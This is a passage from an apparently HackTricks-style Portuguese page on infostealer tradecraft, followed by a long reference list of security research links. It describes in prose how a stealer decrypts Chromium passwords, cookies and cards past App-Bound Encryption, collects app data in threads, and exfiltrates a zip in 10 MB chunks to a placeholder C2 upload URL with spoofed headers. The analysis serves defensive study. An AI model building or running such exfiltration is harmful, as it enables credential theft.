- As rotinas do ChromElevator usam direct-syscall reflective process hollowing para injetar em um Chromium em execução, herdar AppBound Encryption keys, e descriptografar senhas/cookies/cartões de crédito direto dos bancos SQLite apesar do hardening de ABE.

### Coleta modular em memória & exfiltração HTTP em pedaços

- `create_memory_based_log` itera uma tabela global de ponteiros de função `memory_generators` e cria uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada thread grava resultados em buffers compartilhados e reporta sua contagem de arquivos após uma janela de join de ~45s.
- Quando finalizado, tudo é zipado com a biblioteca estaticamente linkada `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, spoofando um boundary de `multipart/form-data` de navegador (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, e o último chunk apende `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
